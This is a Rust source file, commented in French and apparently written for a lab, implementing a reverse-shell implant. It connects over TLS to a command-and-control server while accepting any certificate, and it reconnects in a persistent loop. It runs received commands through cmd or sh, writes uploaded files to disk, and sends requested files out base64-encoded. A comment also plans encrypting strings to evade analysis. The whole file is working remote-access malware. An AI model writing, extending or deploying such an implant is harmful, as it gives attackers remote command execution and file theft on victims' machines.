use std::io::{Write, BufRead, BufReader};
use std::net::TcpStream;
use std::process::Command;
use std::path::Path;
use std::{env, fs};
use native_tls::TlsConnector;
use base64::{Engine as _, engine::general_purpose};

// Configuration du C2
// TODO: Dans une autre version, on pourrait chiffrer ces strings pour éviter le strings/hexdump.
const SERVER_IP: &str = "127.0.0.1"; 
const SERVER_PORT: &str = "4444";

fn main() {
    // 1. INITIALISATION TLS
    // On configure le client pour accepter les certificats auto-signés via `danger_accept_invalid_certs`.
    // Nécessaire ici car nous n'avons pas de PKI valide pour le labo.
    // Si l'init échoue, on return direct.
    let connector = match TlsConnector::builder()
        .danger_accept_invalid_certs(true) 
        .build() 
    {
        Ok(c) => c,
        Err(_) => return, 
    };

    // Boucle principale de PERSISTANCE.
    // Si la connexion coupe, le programme ne s'arrête pas, il réessaie indéfiniment.
    loop {
        // Tentative de connexion TCP brute
        match TcpStream::connect(format!("{}:{}", SERVER_IP, SERVER_PORT)) {
            Ok(stream) => {
                // Upgrade vers TLS (Handshake)
                match connector.connect(SERVER_IP, stream) {
                    Ok(stream) => {
                        // Utilisation de BufReader pour gérer la lecture ligne par ligne proprement
                        let mut reader = BufReader::new(stream);
                        let mut buffer = String::new();

                        loop {
                            buffer.clear();
                            // read_line est bloquant : on attend une commande du serveur
                            match reader.read_line(&mut buffer) {
                                Ok(n) => {
                                    if n == 0 { break; } // 0 octets lus = Serveur a fermé la connexion (FIN)
                                    
                                    let cmd_line = buffer.trim().to_string();
                                    
                                    // Astuce Rust : get_mut() permet d'emprunter le TlsStream mutable 
                                    // qui est "possédé" par le reader pour pouvoir écrire la réponse.
                                    let output_stream = reader.get_mut();
                                    
                                    process_command(cmd_line, output_stream);
                                }
                                Err(_) => break, // Erreur réseau (timeout/reset) -> on sort pour reconnecter
                            }
                        }
                    },
                    Err(_) => {
                        // Echec handshake TLS (mauvais cert ou erreur protocole)
                    }
                }
            },
            Err(_) => {
                // Serveur injoignable (éteint ou filtré)
            }
        }

        // On attend 5 secondes avant de retenter pour ne pas flooder le réseau
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}

/// Parse et route la commande reçue vers la bonne fonction
fn process_command(cmd_line: String, stream: &mut native_tls::TlsStream<TcpStream>) {
    let parts: Vec<&str> = cmd_line.split_whitespace().collect();
    if parts.is_empty() { return; }

    let command = parts[0];
    let args = &parts[1..];

    match command {
        "cd" => {
            // Commande interne : changement de répertoire du processus actuel
            let new_dir = if args.is_empty() { "/" } else { args[0] };
            let root = Path::new(new_dir);
            let msg = match env::set_current_dir(&root) {
                Ok(_) => "Repertoire change.".to_string(),
                Err(e) => format!("Erreur CD: {}", e),
            };
            send_response(stream, msg);
        },
        "upload" => {
            // Réception d'un fichier depuis le C2.
            // Format : upload <BASE64_DATA> <NOM_FICHIER>
            if args.len() >= 2 {
                let b64_data = args[0];
                let filename = args[1];

                let msg = match general_purpose::STANDARD.decode(b64_data) {
                    Ok(bytes) => {
                        match fs::write(filename, bytes) {
                            Ok(_) => "Succes: Fichier uploade.".to_string(),
                            Err(e) => format!("Erreur écriture disque: {}", e),
                        }
                    },
                    Err(e) => format!("Erreur décodage Base64: {}", e),
                };
                send_response(stream, msg);
            } else {
                send_response(stream, "Erreur protocole upload.".to_string());
            }
        },
        "download" => {
            // Exfiltration de fichier vers le C2.
            // On encode le fichier en Base64 pour garantir l'intégrité du transfert binaire.
            if let Some(filename) = args.get(0) {
                match fs::read(filename) {
                    Ok(data) => {
                        let b64 = general_purpose::STANDARD.encode(&data);
                        // On écrit directement ici sans wrapper pour simplifier le parsing serveur
                        let _ = stream.write_all(format!("{}\n", b64).as_bytes());
                        let _ = stream.flush();
                    },
                    Err(e) => {
                        let error_msg = format!("ERROR: Impossible de lire '{}': {}", filename, e);
                        send_response(stream, error_msg);
                    }
                }
            }
        },
        "exit" => {
            let _ = stream.write_all(b"Au revoir.\n"); 
            std::process::exit(0);
        },
        _ => {
            // Si ce n'est pas une commande interne, on délègue au shell système (cmd.exe ou bash)
            execute_os_command(command, args, stream);
        }
    }
}

/// Envoie une réponse formatée en Base64 + saut de ligne au serveur.
/// L'encodage B64 évite les problèmes d'encodage (UTF8 vs CP850) et de saut de ligne.
fn send_response(stream: &mut native_tls::TlsStream<TcpStream>, msg: String) {
    let b64 = general_purpose::STANDARD.encode(msg);
    let _ = stream.write_all(format!("{}\n", b64).as_bytes());
}

/// Exécute une commande système en créant un sous-processus.
fn execute_os_command(cmd: &str, args: &[&str], stream: &mut native_tls::TlsStream<TcpStream>) {
    let mut full_cmd = cmd.to_string();
    for arg in args {
        full_cmd.push(' ');
        full_cmd.push_str(arg);
    }

    // Détection de l'OS à la compilation pour choisir le bon interpréteur
    #[cfg(target_os = "windows")]
    let (shell, flag) = ("cmd", "/C");

    #[cfg(not(target_os = "windows"))]
    let (shell, flag) = ("sh", "-c");

    match Command::new(shell).args(&[flag, &full_cmd]).output() {
        Ok(output) => {
            // On capture stdout ET stderr pour avoir un retour complet
            let mut response_bytes = output.stdout;
            if !output.stderr.is_empty() {
                response_bytes.extend_from_slice(b"\n--- STDERR ---\n");
                response_bytes.extend(output.stderr);
            }

            // Encodage Base64 indispensable pour renvoyer des output multilignes proprement
            let b64_response = general_purpose::STANDARD.encode(&response_bytes);
            let _ = stream.write_all(format!("{}\n", b64_response).as_bytes());
        },
        Err(e) => {
            let error_msg = format!("Impossible d'exécuter: {}", e);
            send_response(stream, error_msg);
        }
    }
}